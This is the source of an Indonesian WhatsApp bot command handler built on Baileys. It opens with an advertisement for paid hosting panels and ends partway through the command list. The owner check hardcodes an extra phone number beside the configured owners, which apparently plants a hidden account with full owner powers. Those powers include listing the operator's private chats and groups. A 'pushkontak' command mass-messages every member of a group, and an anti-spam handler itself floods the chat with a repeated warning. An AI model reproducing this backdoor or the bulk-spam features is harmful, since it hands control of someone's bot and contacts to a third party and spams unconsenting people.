/*
   • Base By ArxzyDev
   • Recode By QyuuNee
   • Jual Sc? Neraka Paling Bawah
   • My Contact https://wa.me/6288210828960
    
   乂 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗣𝗔𝗡𝗘𝗟 乂

   • RAM 1GB CPU 30% 3K/BULAN
   • RAM 2GB CPU 50% 5K/BULAN
   • RAM 3GB CPU 70% 8K/BULAN
   • RAM 4GB CPU 90% 10K/BULAN
   • RAM 5GB CPU 110% 12K/BULAN

   • RAM - CPU UNLIMITED 15K/BULAN

   🍁– FRESH
   🍁– ANTI DELAY
   🍁– GA BOROS KUOTA
   🍁– GA MENUHIN MEMORI
   🍁– BISA BUAT RUN BOT NO RIBET
   🍁– WEBSITE CLOSE BOT TETAP ON

   🔰「 BUY PANEL BOT 」
    •  https://wa.me/6288210828960
   
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { modul } = require('./module');
const { ytdl } = modul;
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const fsx = require('fs-extra')
const bochil = require('@bochilteam/scraper')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const jsobfus = require('javascript-obfuscator')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { ChatAIHandler } = require('./lib/openai')
const { remini } = require('./lib/remini')
const { TelegraPH } = require("./lib/TelegraPH")
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');

// read database
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
    users: {},
    group: {},
    chats: {},
    tebakgambar: {},
    database: {},
    settings: {},
    donate: {},
    others: {},
    sticker: {},
    ...(global.db.data || {})
}
let tebakgambar = global.db.data.tebakgambar = []

moment.tz.setDefault("Asia/Jakarta").locale("id")

module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await conn.decodeJid(conn.user.id)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        const isCreator = [botNumber, ...global.owner, '6285749037935@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)

	    
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
        const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${namaowner}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Koi,;;;\nFN:Nobita-Md\nitem1.TEL;waid=${owner}:+${nomerowner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': thumb,
                    thumbnail: thumb,
                    sendEphemeral: true
                }   
            }
        }
        // Database Tambahan!!

        let prem = JSON.parse(fs.readFileSync('./database/premium.json'))
        let ban = JSON.parse(fs.readFileSync('./database/banned.json'))
        let vnnya = JSON.parse(fs.readFileSync('./database/vnnya.json'))
        let db_error = JSON.parse(fs.readFileSync('./database/error.json'));
        let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
        
        
        // Const Tambahan Sc Gw
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const getCase = (cases) => {
            return "case  "+`'${cases}'`+fs.readFileSync("./koneko.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }
        const totalFitur = () =>{
            var mytext = fs.readFileSync("./koneko.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        const sendvn = (teks) => {
            conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        }

        for (let anju of vnnya) {
            if (budy === anju) {
                let buffer = conn.sendMessage(m.chat, { audio: fs.readFileSync(`./database/AUDIO/${anju}.mp3`), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
            }
        }
        

        // Function Created By Nobita-Md
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}

function generateRandomPassword() {
    return Array(10).fill(null).map(() => (Math.random() * 16 | 0).toString(16)).join('');
}

async function loading () {
var hawemod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"~_*©NobitaOfc*_~\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < hawemod.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
}
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Nobita-MD`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const downloadMp4 = async (Link) => {
let gHz = require("./lib/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await conn.sendMessage(m.chat, {image: { url: Lehd.thumb } , caption: `*❖ Channel Name* : ${ghed.player_response.videoDetails.author}
*❖ Channel Link* : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
*❖ Title* : ${Lehd.meta.title}
*❖ Duration* : ${Lehd.meta.duration}
*❖ Desc* : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await conn.sendMessage(m.chat, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./lib/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await conn.sendMessage(m.chat, { image: { url: Puxa.thumb } , caption: `*❖ Channel Name* : ${PlXz.player_response.videoDetails.author}
*❖ Channel Link* : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}

*❖ Title* : ${Puxa.meta.title}
*❖ Duration* : ${Puxa.meta.duration}
*❖ Desc* : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await conn.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

const newReply = (teks) => {
conn.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ucapanWaktu,"body": `👋🏻 Hai kak ${pushname}`, "previewType": "PHOTO","thumbnail": logo,"sourceUrl": `https://instgram.com/nobita7.io`}}}, { quoted: m })}

        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkyt' in chats)) chats.antilinkyt = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antivirtex' in chats)) chats.antivirtex = true
                if (!('antilinkv2' in chats)) chats.antilinkv2 = false
                if (!('antipanel' in chats)) chats.antipanel = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
                antilinkyt: false,
                antilinktt: false,
                antivirtex: true,
                antilinkv2: false,
                antipanel: false
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

        } catch (err) {
            console.error(err)
        }
        // Public & Self
        if (!conn.public) {
            if (!m.key.fromMe && !isPremium && !isCreator) return
        }

        if (m.message) {
            if (global.db.data.settings[botNumber].autoread) {
            conn.readMessages([m.key])
            }
        }
        
        // Push Message To Console && Auto Read
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
        
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	    if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await conn.updateProfileStatus(`I am ${namabot} | Aktif Selama ${uptime}| Mode : ${conn.public ? 'Public-Mode' : 'Self-Mode'} | User : ${Object.keys(global.db.data.users).length}`).catch(_ => _)
		setting.status = new Date() * 1
	    }
	    }
	    
	    for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
newReply(`❗ Don't Tag Him!
💤 He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
⏳ During ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
newReply(`
🌤️ You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
⏳ During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
	
        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: conn.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        conn.ev.emit('messages.upsert', msg)
        }
        
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? ketik ${prefix}tebak gambar`)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        //Anti Link WA
        if (db.data.chats[m.chat].antilink) {
            if (budy.match(`chat.whatsapp.com`)) {
                newReply(`「 ANTI LINK WHATSAPP 」\n\nKamu Terdeteksi Mengirim Link Group, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                let gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return newReply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.sendMessage(m.chat, { delete: m.key })
                await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        if (db.data.chats[m.chat].antilinkv2) {
            if (budy.match(`chat.whatsapp.com`)) {
                newReply(`「 ANTI LINK WHATSAPP 」\n\n*JANGAN SHARE GC LAIN!!!*`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                let gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return newReply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.sendMessage(m.chat, { delete: m.key })
            }
        }
        //Anti Link YouTube
        if (db.data.chats[m.chat].antilinkyt) {
            if (budy.match(`https://youtu.be`)) {
                newReply(`「 ANTI LINK YOUTUBE 」\n\nKamu Terdeteksi Mengirim Link Youtube, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Link Tiktok
        if (db.data.chats[m.chat].antilinktt) {
            if (budy.match(`https://vt.tiktok.com`)) {
                newReply(`「 ANTI LINK TIKTOK 」\n\nKamu Terdeteksi Mengirim Link TikTok, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Panel
        if (db.data.chats[m.chat].antipanel) {
            if (budy.match('panel')) {
            newReply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/6288210828960`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('Panel')) {
            newReply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/6288210828960`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('PANEL')) {
                newReply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/6288210828960`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.sendMessage(m.chat, { delete: m.key })
            }
        }
        //AntiVirtex
        if (db.data.chats[m.chat].antivirtex) {
            if (budy.length > 3500) {
                newReply(`Seseorang mengirim spam virus!! tandai sebagai membaca⚠️\n`.repeat(300))
                newReply(`「 ANTI VIRTEX 」\n\nKamu Terdeteksi Mengirim Virtex, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        // Mute Chat
        if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
            return
        }
        switch (command) {
        
        // Owner Fitur
        case 'public': {
                if (!isCreator) return newReply(mess.owner)
                conn.public = true
                newReply('Sukses Ubah Ke Penggunaan Umum')
        }
        break
        case 'self': {
                if (!isCreator) return newReply(mess.owner)
                conn.public = false
                newReply('Sukses Ubah Ke Penggunaan Sendiri')
            }
        break
        
        case 'addlist':
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return newReply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return newReply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addResponList(m.chat, args1, args2, false, '-', db_respon_list)
            newReply(`Berhasil menambah List menu : *${args1}*`)
        break
        
        case 'dellist':{
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
            var arr_rows = [];
            for (let x of db_respon_list) {
            if (x.id === m.chat) {
            newReply(`Mau Delete Yang Mana?\n\n${x.key}`)
        }}
        }
        break
        case 'enc': {
            if (!isCreator) return newReply(mess.owner)
            if (!q) return newReply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            newReply(`${meg.result}`)
        }
        break
        
        case "pk":
        case 'pushkontak': {
            if (!text) return newReply(`Example ${prefix}${command} Hi Semuanya`)
            if (!isCreator) return newReply(mess.owner)
            let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = get.length;
            let sentCount = 0;
            newReply('*_Sedang Push Kontak..._*');
            for (let i = 0; i < get.length; i++) {
              setTimeout(function() {
                conn.sendMessage(get[i], { text: text });
                count--;
                sentCount++;
                if (count === 0) {
                  newReply(`*Sukses Mengirim Pesan!*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
                }
              }, i * 1000); // delay setiap pengiriman selama 1 detik
            }
            }
            break
        
        case 'addvn':{
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply('Nama audionya apa')
            if (vnnya.includes(q)) return newReply("Nama tersebut sudah di gunakan")
            let delb = await conn.downloadAndSaveMediaMessage(quoted)
            vnnya.push(q)
            await fsx.copy(delb, `./database/AUDIO/${q}.mp3`)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(delb)
            newReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
        }
        break
        case 'delvn':{
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply('Masukan query')
            if (!vnnya.includes(q)) return newReply("Nama tersebut tidak ada di dalam data base")
            let wanu = vnnya.indexOf(q)
            vnnya.splice(wanu, 1)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(`./database/AUDIO/${q}.mp3`)
            newReply(`Sukses delete vn ${q}`)
        }
        break
        
        case 'listvn':{
            let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
            for (let x of vnnya) {
            teksooo += `│⭔ ${x}\n`
            }
            teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnya.length}*`
            newReply(teksooo)
        }
        break

        case 'addprem':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknye = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
            if (ceknye.length == 0) return newReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            premium.push(bnnd)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            newReply(`Sekarang Nomor ${bnnd} Telah Premium!!!`)
        break
        
        case 'delprem':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            yaki = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = premium.indexOf(yaki)
            premium.splice(unp, 1)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            newReply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
        break
        
        case 'listprem':
            teksooo = '*List Premium*\n\n'
            for (let i of premium) {
                teksooo += `- ${i}\n`
            }
            teksooo += `\n*Total : ${premium.length}*`
            conn.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
        break
case 'listseler':
            teksooo = '*List Reseller Panel*\n\n'
            for (let i of premium) {
                teksooo += `- ${i}\n`
            }
            teksooo += `\n*Total : ${premium.length}*`
            conn.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
        break
       
        case 'myip': {
        if (!isCreator) return newReply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        newReply("🔎 My public IP address is: " + ip);
                    })
                })
            }
        break
        
        case 'listpc': {
                if (!isCreator) return newReply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `*🔒 LIST PERSONAL CHAT*\n\n`
                tekslist += `*📱 Total Chat :* ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `📛 *Nama :* ${nama}\n`
                    tekslist += `👤 *User :* @${i.split('@')[0]}\n`
                    tekslist += `🔗 *Link Chat :* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                newReply(tekslist)
            }
        break
        
        case 'listgc': {
                if (!isCreator) return newReply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let tekslistgc = `👥 *LIST GROUP CHAT*\n\n`
                tekslistgc += `📱 Total Group : ${anu.length} Group\n\n`
                for (let e of anu) {
                    let metadata = await conn.groupMetadata(e)
                    tekslistgc += `📛 *Nama :* ${metadata.subject}\n`
                    tekslistgc += `👤 *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
                    tekslistgc += `🌱 *ID :* ${metadata.id}\n`
                    tekslistgc += `⏳ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                    tekslistgc += `👥 *Member :* ${metadata.participants.length}\n\n`
                    tekslistgc += `──────────────────────\n\n`
                }
                newReply(tekslistgc)
            }
        break
        
        case 'chat': {
                if (!isCreator) return newReply(mess.owner)
                if (!q) return newReply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    conn.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    conn.chatModify({ mute: null }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    conn.chatModify({ archive: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    conn.chatModify({ archive: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    conn.chatModify({ markRead: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    conn.chatModify({ markRead: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    conn.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                }
